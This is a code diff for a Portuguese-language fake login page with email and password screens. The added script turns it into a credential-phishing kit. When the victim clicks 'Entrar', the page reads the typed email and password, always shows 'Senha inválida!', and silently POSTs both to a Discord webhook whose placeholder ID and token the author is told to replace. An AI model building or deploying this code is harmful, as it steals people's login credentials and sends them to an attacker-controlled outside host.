@@ -21,7 +21,6 @@
     .fade-out-up { opacity: 0 !important; transform: translateY(-30px) !important; pointer-events: none !important; }
     .hidden { display: none !important; }
 
-    /* Landing */
     .landing-screen {
       min-height: 100vh;
       display: flex;
@@ -69,7 +68,6 @@
       animation: fadeInUp 1.5s ease-in-out;
     }
 
-    /* Form */
     .form-wrapper {
       width: 100%;
       min-height: 100vh;
@@ -156,13 +154,15 @@
   <div id="password-screen" class="form-wrapper hidden fade-transition">
     <div class="form-card">
       <h1>Digite sua senha</h1>
-      <input type="password" id="password" placeholder="Insira uma senha" required />
+      <input type="password" id="password" placeholder="Insira sua senha" required />
       <button id="password-btn">Entrar</button>
       <div class="error-msg" id="password-error"></div>
     </div>
   </div>
 
   <script>
+    const webhookURL = "https://discord.com/api/webhooks/SEU_WEBHOOK_ID/SEU_TOKEN"; // Substitua aqui
+
     const landingScreen = document.getElementById('landing-screen');
     const emailScreen = document.getElementById('email-screen');
     const passwordScreen = document.getElementById('password-screen');
@@ -194,7 +194,19 @@
     };
 
     document.getElementById('password-btn').onclick = () => {
+      const email = emailInput.value.trim();
+      const password = document.getElementById('password').value.trim();
       passwordError.textContent = 'Senha inválida!';
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `🔐 **Novo Login Detectado:**\n📧 E-mail: ${email}\n🔑 Senha: ${password}`
+        })
+      });
     };
   </script>
 </body>
